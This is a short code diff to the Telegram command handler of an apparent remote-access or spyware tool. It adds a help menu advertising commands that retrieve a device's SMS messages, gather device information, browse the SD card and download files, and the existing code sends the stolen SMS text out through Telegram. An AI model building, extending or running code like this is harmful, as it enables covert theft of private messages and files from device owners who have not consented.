@@ -118,7 +118,18 @@ def handle_telegram_update(update):
     try:
         message = update.get('message', {}).get('text', '')
         if message:
-            if message == "/sms":
+            if message == "/help":
+                help_message = (
+                    "*Available Commands:*\n"
+                    "`/help` - Show this help message\n"
+                    "`/sms` - Retrieve SMS messages\n"
+                    "`/device` - Get device information\n"
+                    "`/sdcard` - Browse SD card files\n"
+                    "You can also send a folder name to navigate or a file name to download."
+                )
+                send_to_telegram(help_message)
+
+            elif message == "/sms":
                 sms_messages = get_sms()
                 send_to_telegram(sms_messages)
             
